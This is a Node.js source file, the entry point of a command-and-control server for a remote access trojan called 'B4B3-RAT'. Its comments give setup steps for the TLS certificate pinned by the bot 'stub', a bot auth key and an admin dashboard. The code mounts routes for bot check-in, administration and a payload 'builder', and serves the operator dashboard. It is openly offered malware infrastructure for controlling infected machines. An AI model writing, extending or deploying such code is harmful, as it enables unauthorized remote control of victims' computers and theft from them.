/**
 * B4B3-RAT C2 Server — slim entry point
 *
 * TLS (required — stub pins the cert):
 *   openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem \
 *     -days 365 -nodes -subj "/CN=<your_c2_hostname>"
 *   Place cert.pem and key.pem in this directory.
 *
 * Environment variables:
 *   C2_AUTH       Bot auth key     (default: changeme)
 *   C2_PORT       Port             (default: 4444)
 *   ADMIN_PASS    Dashboard pw     (default: admin123)
 *   CORS_ORIGIN   Frontend origin  (e.g. https://dashboard.example.com)
 *                 Leave blank when frontend is served by nginx on same host.
 */

"use strict";

const fs           = require("fs");
const path         = require("path");
const https        = require("https");
const http         = require("http");
const express      = require("express");
const session      = require("express-session");
const cookieParser = require("cookie-parser");

const { PORT, CORS_ORIGIN, UPLOADS_DIR } = require("./config/constants");

const certPath = path.join(__dirname, "cert.pem");
const keyPath  = path.join(__dirname, "key.pem");
const hasTLS   = fs.existsSync(certPath) && fs.existsSync(keyPath);

// Ensure uploads directory exists
if (!fs.existsSync(UPLOADS_DIR)) fs.mkdirSync(UPLOADS_DIR, { recursive: true });

const app = express();

// ── CORS (only when frontend is on a different origin) ────────────────────────
if (CORS_ORIGIN) {
  app.use((req, res, next) => {
    res.header("Access-Control-Allow-Origin",      CORS_ORIGIN);
    res.header("Access-Control-Allow-Credentials", "true");
    res.header("Access-Control-Allow-Methods",     "GET,POST,PATCH,DELETE,OPTIONS");
    res.header("Access-Control-Allow-Headers",     "Content-Type");
    if (req.method === "OPTIONS") return res.sendStatus(204);
    next();
  });
}

// ── Core middleware ───────────────────────────────────────────────────────────
app.use(express.json({ limit: "512kb" }));
app.use(express.urlencoded({ extended: true }));
app.use(cookieParser());
app.use(session({
  secret:            "b4b3-c2-session-secret-change-me",
  resave:            false,
  saveUninitialized: false,
  cookie: {
    secure:   hasTLS,                            // true only when cert.pem exists
    httpOnly: true,
    sameSite: (hasTLS && CORS_ORIGIN) ? "none" : "lax",  // none only when HTTPS + cross-origin
    maxAge:   8 * 60 * 60 * 1000,
  },
}));

// ── Routes ────────────────────────────────────────────────────────────────────
app.use(require("./routes/auth"));
app.use(require("./routes/stub"));
app.use(require("./routes/admin"));
app.use(require("./routes/builder"));

// ── Dashboard static files ────────────────────────────────────────────────────
// Serves c2-dashboard/ at the root so login.html and index.html are reachable
// at http(s)://localhost:<PORT>/login.html — no CORS needed, same origin as API.
app.use(express.static(path.join(__dirname, "../c2-dashboard")));

// ── TLS / start ───────────────────────────────────────────────────────────────
if (hasTLS) {
  https.createServer({ cert: fs.readFileSync(certPath), key: fs.readFileSync(keyPath) }, app)
    .listen(PORT, () => {
      const { AUTH_KEY, ADMIN_PASS } = require("./config/constants");
      console.log(`\n=== B4B3-RAT C2 Server (HTTPS) ===`);
      console.log(`URL        : https://localhost:${PORT}`);
      console.log(`Auth key   : ${AUTH_KEY}`);
      console.log(`Admin pass : ${ADMIN_PASS}`);
      if (CORS_ORIGIN) console.log(`CORS origin: ${CORS_ORIGIN}`);
      console.log();
    });
} else {
  console.warn("[!] cert.pem/key.pem not found — HTTP only (stub requires TLS)");
  http.createServer(app).listen(PORT, () => {
    const { AUTH_KEY, ADMIN_PASS } = require("./config/constants");
    console.log(`=== B4B3-RAT C2 Server (HTTP) ===`);
    console.log(`URL        : http://localhost:${PORT}`);
    console.log(`Auth key   : ${AUTH_KEY}`);
    console.log(`Admin pass : ${ADMIN_PASS}`);
    if (CORS_ORIGIN) console.log(`CORS origin: ${CORS_ORIGIN}`);
    console.log();
  });
}
